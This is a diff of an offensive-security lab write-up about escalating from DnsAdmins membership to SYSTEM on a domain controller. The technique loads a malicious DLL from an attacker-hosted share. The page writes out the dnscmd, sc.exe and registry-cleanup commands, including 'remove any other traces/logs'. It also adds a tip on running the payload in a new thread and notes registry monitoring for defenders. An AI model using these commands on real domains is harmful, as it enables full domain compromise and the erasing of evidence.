@@ -2,7 +2,7 @@
 
 In this lab I'm trying to get code execution with `SYSTEM` level privileges on a DC that runs a DNS service as originally researched by Shay Ber [here](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83).
 
-The attack relies on a [DLL injection](../../offensive-security/t1055-process-injection/dll-injection.md) into the dns service running as SYSTEM on the DNS server which most of the time is on a Domain Contoller.
+The attack relies on a [DLL injection](../../offensive-security/code-injection-process-injection/dll-injection.md) into the dns service running as SYSTEM on the DNS server which most of the time is on a Domain Contoller.
 
 ## Execution
 
@@ -30,13 +30,11 @@ rundll32.exe .\dnsprivesc.dll,DnsPluginInitialize
 
 Now that we have the DLL and we checked that it is working, we can ask the victim `DC01` to load our malicious DLL \(from the victim controlled network share on host 10.0.0.2\) next time the service starts \(or when the attacker restarts it\):
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim.memberOfDnsAdmins" %}
+{% code title="attacker@victim.memberOfDnsAdmins" %}
 ```csharp
 dnscmd dc01 /config /serverlevelplugindll \\10.0.0.2\tools\dns-priv\dnsprivesc.dll
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 The below looks promising and suggests the request to load our malicious DLL was successful:
 
@@ -61,14 +59,12 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name S
 
 Now the next time dns service starts, our malicious DLL should be loaded to the dns.exe process and a reverse shell should be sent back to our attacking system, so let's go and restart the DNS service:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 sc.exe \\dc01 stop dns
 sc.exe \\dc01 start dns
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 By this point, I should have received a reverse shell, but unfortunately, I did not.
 
@@ -120,8 +116,7 @@ Below confirms that the dns service is down, however we can still access the DC 
 
 One could think about scripting/automating the after-attack cleanup and the DNS service restoration and include the required code in the same malicious DLL that creates a backdoor user in the first place:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% code title="attacker@victim" %}
 ```csharp
 reg query \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
 reg delete \\10.0.0.6\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
@@ -129,8 +124,7 @@ sc.exe \\10.0.0.6 stop dns
 sc.exe \\10.0.0.6 start dns
 //remove any other traces/logs
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-11-11-23-21-55.png)
 
@@ -153,6 +147,12 @@ As a defender, one should considering monitoring for suspicious child processes 
 ![](../../.gitbook/assets/screenshot-from-2018-11-12-22-09-43.png)
 
 Also, you may want to consider monitoring `HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters` value `ServerLevelPluginDll`, especially if it begins with string `\\` in the data field.
+
+## Update \#1
+
+I was pointed out by a reader that a video by ippsec [https://youtu.be/8KJebvmd1Fk?t=3130](https://youtu.be/8KJebvmd1Fk?t=3130) explains why the dns service was crashing, so please check the video, but if you are too lazy, the answer is provided here too.
+
+You need to execute your code in a **new thread** \(this was the missing piece in my first attempt\) in the exported DLL function `DnsPluginInitialize`, which is the function that gets invoked, when the dnscmd load our malicious DLL.
 
 ## References
 
